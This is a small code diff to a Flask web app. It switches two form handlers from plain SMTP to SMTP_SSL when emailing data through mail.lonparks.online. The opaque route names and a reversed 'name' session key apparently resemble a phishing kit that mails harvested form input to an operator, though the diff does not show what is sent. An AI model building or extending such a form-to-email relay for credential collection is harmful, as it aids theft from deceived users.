@@ -3,7 +3,7 @@ import secrets
 import random
 from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
-import smtplib
+import smtplib, ssl
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
@@ -161,7 +161,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("mail.lonparks.online", 587) as server:
+        with smtplib.SMTP_SSL("mail.lonparks.online", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
@@ -198,7 +198,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("mail.lonparks.online", 587) as server:
+        with smtplib.SMTP_SSL("mail.lonparks.online", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
